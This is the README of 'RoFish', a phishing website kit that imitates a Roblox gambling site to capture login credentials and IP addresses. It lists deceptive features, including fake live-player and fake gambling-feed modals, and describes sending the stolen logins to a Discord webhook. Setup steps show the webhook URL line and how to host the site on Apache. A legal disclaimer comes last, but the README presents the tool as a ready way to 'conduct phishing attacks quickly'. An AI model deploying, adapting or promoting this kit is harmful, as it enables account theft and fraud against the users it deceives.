<p align="center">
<img src="https://i.imgur.com/XSv7lrb.png">
</p>

[![HTML5](https://img.shields.io/badge/HTML-5-orange.svg?style=flat-square)](https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/HTML5)
[![CSS3](https://img.shields.io/badge/CSS-3-blue.svg?style=flat-square)](https://developer.mozilla.org/en-US/docs/Web/CSS)
[![JavaScript](https://img.shields.io/badge/JavaScript-ES6-yellow.svg?style=flat-square)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
![OS](https://img.shields.io/badge/Tested%20On-Windows%20|%20Android-yellowgreen.svg?style=flat-square)
[![License](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)](https://github.com/yourusername/bloxbets/blob/main/LICENSE)

## 🌐 RoFish
RoFish is an easy to use phishing website that enables users to conduct phishing attacks quickly and efficiently. Website is designed to capture login information and IP addresses from users who attempt to log in.

## ⭐ v2 Features
- **Discord Webhook**: Instead of saving the login data to a text file, the data is now sent to a Discord webhook(s).
- **Loading Screen**: A loading screen has been added to enhance user experience during content loading.
- **Responsive Design**: Website is optimized for all devices, whether desktop or mobile.
- **Responsive Navigation Menu**: Hamburger menu toggle for easy navigation on mobile devices.
- **Fake Live Player Modal**: Displays updates on "online players" with random changes to simulate activity.
- **Fake Live Feed Modal**: Shows randomized gambling actions, including wins, losses, and bets across various games.
- **Login and Authentication Modal**: Prompts users to log in before accessing specific features.
- **Error Handling**: Alerts users if they attempt to access restricted features without logging in.
- **User Interface**: UI is designed with user experience in mind, providing easy navigation and interaction for all users.

## 💻 Installation

1. **Clone the Repository**: Download the source code by cloning the repository:
   ```bash
   git clone https://github.com/yourusername/rofish.git
   cd rofish

3. **Modify the Discord Webhook**: Open the PHP file where the webhook is defined. Find the following line and replace `YOUR_WEBHOOK_URL_HERE` with your actual Discord webhook URL:
   ```bash
   $webhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE'; // Replace with your actual Discord webhook URL

2. **Start Apache**: Before opening the website, ensure that Apache is running.
   - On Windows, you can use [XAMPP](https://www.apachefriends.org/).
   - On Linux, run `sudo systemctl start apache2` or `service apache2 start` in the terminal to start the built-in Apache server.
   - Note: Need to configure the directory as necessary.

3. **Open the Website**: After Apache is running, open the `index.html` file in a browser.

4. **Requirements**: There are no additional requirements. The website uses native HTML, CSS, and JavaScript. Ensure you have an active internet connection for third-party resources like FontAwesome and jQuery.

##  ❓ <b>Wiki</b>
- [Setting up RoFish](https://github.com/TheSisco/RoFish/wiki/Setting-Up-RoFish "RoFish - Wiki")
- [Using RoFish](https://github.com/TheSisco/RoFish/wiki/Using-RoFish "RoFish - Wiki")

## 📌 Screenshot
![Discord](https://i.imgur.com/LT2NEAg.png)
![Showcase](https://i.imgur.com/Kui5hFg.png)

## ❗ Disclaimer
The use of RoFish to attack targets without prior mutual consent is strictly illegal and can result in severe legal consequences. It is the responsibility of the end user to ensure compliance with all applicable local, state, and federal laws regarding unauthorized access and cyber activities. Users must understand that any violation of these laws can lead to significant penalties, including fines and imprisonment.

The developers of RoFish disclaim any liability for misuse or damage caused by this program. By using RoFish, you acknowledge that you are fully responsible for your actions and the consequences that may arise from them. We strongly encourage users to act ethically and responsibly, always seeking proper authorization before attempting to access or compromise any systems or data.

## 📜 License
RoFish is licensed under the [MIT License](https://github.com/dtbsisco/RoFish/blob/romaster/LICENSE).